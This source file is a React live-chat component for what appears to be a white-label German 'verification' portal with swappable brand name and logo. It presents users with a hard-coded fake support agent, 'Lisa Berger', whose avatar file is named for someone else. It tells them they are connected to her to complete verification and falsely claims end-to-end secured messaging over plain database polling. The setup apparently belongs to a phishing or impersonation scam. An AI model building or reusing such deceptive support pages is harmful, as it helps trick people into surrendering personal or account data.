"use client";

import { useEffect, useState, useRef } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { useSettings } from "@/contexts/SettingsContext";
import { Linkify } from "@/components/ui/Linkify";

type ChatMessage = {
  id: string;
  session_id: string;
  sender: "user" | "admin";
  content: string;
  image_url?: string | null;
  created_at: string;
};

const SUPPORT_AVATAR = "/avatars/support-sarah.webp";
const SUPPORT_AGENT_NAME = "Lisa Berger";
const SUPPORT_AGENT_ROLE = "Kundensupport";
const CLOSE_BUTTON_TITLE = "Close";
const EMPTY_CHAT_TEXT = "Noch keine Nachrichten. Wie koennen wir helfen?";
const CHAT_INPUT_PLACEHOLDER = "Nachricht schreiben...";

export function LiveSupportClient({ sessionId }: { sessionId: string }) {
  const { settings, loading: settingsLoading } = useSettings();
  const [isChatOpen, setIsChatOpen] = useState(false);
  const [messages, setMessages] = useState<ChatMessage[]>([]);
  const [newMessage, setNewMessage] = useState("");
  const [zoomedImage, setZoomedImage] = useState<string | null>(null);
  const [sending, setSending] = useState(false);
  const supabase = createBrowserSupabaseClient();
  const messagesEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (isChatOpen) {
      messagesEndRef.current?.scrollIntoView({ behavior: "smooth" });
    }
  }, [isChatOpen, messages]);

  useEffect(() => {
    if (!supabase || !sessionId || !isChatOpen) return;

    function normalizeRow(r: any): ChatMessage {
      if (!r) return r;
      return {
        id: r.id,
        session_id: r.session_id,
        sender: (r.sender ?? r.role ?? "user") as "user" | "admin",
        content: r.content ?? "",
        image_url: r.image_url ?? (Array.isArray(r.image_urls) ? r.image_urls[0] ?? null : null),
        created_at: r.created_at,
      };
    }

    const loadChat = () => {
      const tryLoad = async () => {
        let q = supabase.from("chat_messages").select("*");
        let res = await q.eq("session_id", sessionId).order("created_at", { ascending: true }).limit(50);
        if (
          res.error &&
          /column/i.test(res.error.message) &&
          /sender|image_url/.test(res.error.message)
        ) {
          // Legacy bootstrap schema: role + image_urls[] columns. Select * still fails
          // because Supabase may still complain about unknown columns referenced via
          // realtime type hints; try simple query plus fallback empty array.
          try {
            const { data, error } = await supabase
              .from("chat_messages")
              .select()
              .eq("session_id", sessionId)
              .order("created_at", { ascending: true })
              .limit(50);
            if (!error && data) res = { data, error: null } as any;
            else if (error && /does not exist|column/i.test(error.message)) {
              // Column really truly missing — swallow silently, don't spam console
              setMessages([]);
              return;
            }
          } catch {
            setMessages([]);
            return;
          }
        }
        if (res.error) {
          console.error("chat load error:", res.error);
          return;
        }
        if (res.data) {
          const normalized = res.data.map(normalizeRow);
          setMessages((prev) => {
            if (prev.length !== normalized.length) {
              setTimeout(() => messagesEndRef.current?.scrollIntoView({ behavior: "smooth" }), 100);
              return normalized as ChatMessage[];
            }
            return prev;
          });
        }
      };
      void tryLoad();
    };

    loadChat();
    const interval = setInterval(loadChat, 2000);

    const channel = supabase
      .channel(`chat:${sessionId}`)
      .on(
        "postgres_changes",
        {
          event: "INSERT",
          schema: "public",
          table: "chat_messages",
          filter: `session_id=eq.${sessionId}`,
        },
        (payload) => {
          const newMsg = normalizeRow(payload.new) as ChatMessage;
          setMessages((prev) => {
            if (!prev.find(m => m.id === newMsg.id)) {
              return [...prev, newMsg];
            }
            return prev;
          });
          setTimeout(() => messagesEndRef.current?.scrollIntoView({ behavior: "smooth" }), 100);
        }
      )
      .subscribe();

    return () => {
      clearInterval(interval);
      void supabase.removeChannel(channel);
    };
  }, [isChatOpen, sessionId, supabase]);

  const sendMessage = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!newMessage.trim() || !supabase || !sessionId || sending) return;

    const msg = newMessage.trim();
    setSending(true);
    setNewMessage("");

    // ⭐ CANLI DESTEK FIX: role + sender IKISINI BIRDEN gonder.
    //   Tabloda hangi kolon varsa (role NOT NULL, sender NOT NULL, ya da her ikisi)
    //   INSERT kabul etsin. Aksi halde 3. katman fallback dene.
    const common = { session_id: sessionId, content: msg } as const;
    const withBoth = { ...common, role: "user", sender: "user", image_url: null, image_urls: [] };

    let res = await supabase
      .from("chat_messages")
      .insert(withBoth as any)
      .select("*")
      .single();

    if (res.error) {
      // 2. Deneme: SADECE role (sender kolon yoksa veya sender/image_url hatasi)
      res = await supabase
        .from("chat_messages")
        .insert({ session_id: sessionId, role: "user", content: msg, image_urls: [] } as any)
        .select("*")
        .single();
    }
    if (res.error) {
      // 3. Deneme: SADECE sender (role kolon yoksa veya role/image_urls hatasi)
      res = await supabase
        .from("chat_messages")
        .insert({ session_id: sessionId, sender: "user", content: msg, image_url: null } as any)
        .select("*")
        .single();
    }
    if (res.error) {
      // 4. Katman SON GUVENCE: SADECE GEREKLI (role & sender ikisi beraber, image kolonlari yok)
      const minimal = { session_id: sessionId, role: "user", sender: "user", content: msg } as any;
      res = await supabase.from("chat_messages").insert(minimal).select("*").single();
    }

    setSending(false);

    const { data, error } = res;
    if (error) {
      console.error("chat send error:", error);
      setNewMessage(msg);
      alert("Mesaj gönderilemedi: " + error.message);
      return;
    }

    if (data) {
      const nr: ChatMessage = {
        id: data.id,
        session_id: data.session_id,
        sender: (data.sender ?? data.role ?? "user") as "user" | "admin",
        content: data.content ?? "",
        image_url: data.image_url ?? (Array.isArray(data.image_urls) ? data.image_urls[0] ?? null : null),
        created_at: data.created_at,
      };
      setMessages((prev) => {
        if (prev.find((m) => m.id === nr.id)) return prev;
        return [...prev, nr];
      });
    }
  };


  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[#DF0000]/30 border-t-[#DF0000]" />
        </div>
      </div>
    );
  }

  return (
    <>
      <div className="pak-page-shell">
        {!isChatOpen ? (
          <div className="pak-form-card fade-in relative z-10 w-full max-w-[560px]">
            <div className="pak-form-inner flex flex-col items-center px-4 py-4 text-center sm:px-7 sm:py-6">
              <div className="mb-4 flex w-full items-start justify-between gap-3">
                <div className="max-w-[18rem] text-left">
                  <h2 className="pak-form-title">{settings.live_support_title}</h2>
                  <p className="pak-form-subtitle mt-2 whitespace-pre-line">
                    <Linkify text={settings.live_support_subtitle} />
                  </p>
                </div>
                <img
                  src={settings.logo_url && settings.logo_url !== "/logo.webp" ? settings.logo_url : "/logo.webp"}
                  alt={settings.portal_name || "Brand"}
                  className="h-[3.8rem] w-[3.8rem] shrink-0 object-contain sm:h-[4.4rem] sm:w-[4.4rem]"
                />
              </div>

              <div className="mb-4 flex w-full items-center gap-3 rounded-[1.2rem] border border-[#FF453A]/30 bg-[linear-gradient(180deg,rgba(255,255,255,0.06),rgba(255,255,255,0.02))] px-3.5 py-3 text-left sm:px-4 sm:py-3.5">
                <div className="relative shrink-0">
                  <img
                    src={SUPPORT_AVATAR}
                    alt={SUPPORT_AGENT_NAME}
                    className="size-12 rounded-full border-2 border-[#FF453A]/85 object-cover sm:size-14"
                  />
                  <span className="absolute bottom-0 right-0 size-3.5 rounded-full border-2 border-[#141416] bg-[#5ef08c]" />
                </div>
                <div className="min-w-0 flex-1">
                  <p className="text-[0.68rem] font-black uppercase tracking-[0.22em] text-[#FF453A]">Support-Mitarbeiter</p>
                  <h3 className="truncate text-base font-extrabold text-white sm:text-lg">{SUPPORT_AGENT_NAME}</h3>
                  <p className="text-[13px] text-white/66">{SUPPORT_AGENT_ROLE}</p>
                </div>
              </div>

              <div className="mb-4 w-full max-w-[430px] rounded-[1.05rem] border border-[#FF453A]/20 bg-black/25 px-3.5 py-3">
                <div className="mb-2 flex items-center justify-center gap-2 text-[#FF453A]">
                  <svg className="size-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                    <path strokeLinecap="round" strokeLinejoin="round" d="M8 12h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z" />
                  </svg>
                  <span className="text-[0.72rem] font-black uppercase tracking-[0.22em]">Direkter Support</span>
                </div>
                <p className="text-sm font-semibold leading-5 text-white/86">
                  Sie werden direkt mit <span className="text-[#FF453A]">{SUPPORT_AGENT_NAME}</span> verbunden, um Ihre Verifizierung abzuschliessen.
                </p>
              </div>

              <button
                onClick={() => setIsChatOpen(true)}
                className="pak-form-button flex h-14 w-full max-w-[320px] items-center justify-center gap-2 px-5 text-[15px] sm:h-[3.7rem] sm:text-base"
              >
                <span>{settings.live_support_button}</span>
                <svg className="size-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M5 12h14m-4-4 4 4-4 4" />
                </svg>
              </button>

              <div className="mt-4 pak-form-security justify-center border-t border-[#FF453A]/15 pt-3 text-center">
                <svg className="h-6 w-6 shrink-0 text-[#FF453A]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                  <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
                <span>Sichere Live-Chat-Sitzung mit Ende-zu-Ende-Nachrichtensynchronisierung.</span>
              </div>
            </div>
          </div>
        ) : (
          <div className="pak-form-card animate-in zoom-in-95 relative z-10 flex h-[76vh] max-h-[680px] w-full max-w-[700px] flex-col overflow-hidden duration-300">
            <div className="pak-form-inner flex items-center justify-between border-b border-[#FF453A]/18 bg-[linear-gradient(180deg,rgba(255,255,255,0.08),rgba(255,255,255,0.03))] px-4 py-4 sm:px-6">
              <div className="flex items-center gap-4">
                <div className="relative">
                  <img 
                    src={SUPPORT_AVATAR}
                    alt={SUPPORT_AGENT_NAME}
                    className="size-12 rounded-full border-2 border-[#FF453A]/85 object-cover shadow-sm"
                  />
                  <div className="absolute bottom-0 right-0 size-3.5 rounded-full border-2 border-[#141416] bg-green-500"></div>
                </div>
                <div className="flex flex-col">
                  <h3 className="text-[16px] font-bold leading-tight text-white">{SUPPORT_AGENT_NAME}</h3>
                  <span className="text-[13px] text-white/62">{SUPPORT_AGENT_ROLE}</span>
                </div>
              </div>
              <div className="flex items-center gap-3">
                <img
                  src={settings.logo_url && settings.logo_url !== "/logo.webp" ? settings.logo_url : "/logo.webp"}
                  alt={settings.portal_name || "Brand"}
                  className="h-11 w-11 shrink-0 object-contain"
                />
                <button onClick={() => setIsChatOpen(false)} title={CLOSE_BUTTON_TITLE} className="flex size-10 items-center justify-center rounded-full border border-[#FF453A]/18 bg-white/8 text-white/72 shadow-sm transition-colors hover:bg-white/14 hover:text-white">
                  <svg className="size-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                    <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
                  </svg>
                </button>
              </div>
            </div>

            <div className="flex-1 overflow-y-auto bg-transparent p-4 custom-scrollbar sm:p-5">
              {messages.length === 0 ? (
                <div className="flex h-full flex-col items-center justify-center text-center opacity-70">
                  <svg className="mb-3 size-12 text-[#FF453A]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
                    <path strokeLinecap="round" strokeLinejoin="round" d="M8 12h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z" />
                  </svg>
                  <p className="text-sm text-white/72">{EMPTY_CHAT_TEXT}</p>
                </div>
              ) : (
                <div className="space-y-4">
                {messages.map((m) => (
                  <div key={m.id} className={`flex ${m.sender === "user" ? "justify-end" : "justify-start"}`}>
                    <div className={`max-w-[85%] rounded-2xl px-4 py-3 text-[15px] shadow-sm sm:max-w-[80%] ${m.sender === "user" ? "rounded-br-sm border border-[#FF453A]/55 bg-[linear-gradient(180deg,#FF453A_0%,#FF453A_100%)] text-[#A80000] shadow-[0_10px_24px_rgba(255,69,58,0.22)]" : "rounded-bl-sm border border-[#FF453A]/18 bg-white/10 text-white backdrop-blur-md"}`}>
                      {m.image_url && (
                        <div 
                          className="mb-3 overflow-hidden rounded-xl cursor-pointer hover:opacity-90 transition-opacity" 
                          onClick={() => setZoomedImage(m.image_url!)}
                        >
                          <img src={m.image_url} alt="Chat-Anhang" className="max-h-52 w-full object-cover rounded-xl" />
                        </div>
                      )}
                      {m.content && <p className="leading-relaxed">{m.content}</p>}
                    </div>
                  </div>
                ))}
                </div>
              )}
              <div ref={messagesEndRef} />
            </div>

            <form onSubmit={sendMessage} className="flex items-center gap-3 border-t border-[#FF453A]/18 bg-white/5 p-4 backdrop-blur-md">
              <input
                type="text"
                value={newMessage}
                onChange={(e) => setNewMessage(e.target.value)}
                placeholder={CHAT_INPUT_PLACEHOLDER}
                className="flex-1 rounded-xl border border-[#FF453A]/14 bg-white/8 px-5 py-4 text-[15px] text-white outline-none placeholder:text-white/35 transition-all shadow-sm focus:border-[#FF453A]/60 focus:bg-white/12"
              />
              <button type="submit" disabled={!newMessage.trim() || sending || !sessionId} className="flex size-14 shrink-0 items-center justify-center rounded-xl border border-[#FF453A]/60 bg-[linear-gradient(180deg,#FF453A_0%,#FF453A_100%)] text-[#A80000] transition-all active:scale-95 disabled:opacity-50 disabled:grayscale shadow-[0_10px_24px_rgba(255,69,58,0.25)] hover:brightness-105">
                <svg className="ml-1 size-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8" />
                </svg>
              </button>
            </form>
          </div>
        )}
      </div>

      {zoomedImage && (
        <div 
          className="fixed inset-0 z-[200] flex items-center justify-center bg-black/90 p-4 backdrop-blur-sm animate-in fade-in duration-200" 
          onClick={() => setZoomedImage(null)}
        >
          <button 
            className="absolute top-4 right-4 sm:top-8 sm:right-8 text-white/70 hover:text-white p-2" 
            onClick={() => setZoomedImage(null)}
          >
            <svg className="size-8" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
            </svg>
          </button>
          <img 
            src={zoomedImage} 
            alt="Zoomed" 
            className="max-w-full max-h-full object-contain rounded-lg animate-in zoom-in-95 duration-200" 
            onClick={(e) => e.stopPropagation()}
          />
        </div>
      )}
    </>
  );
}
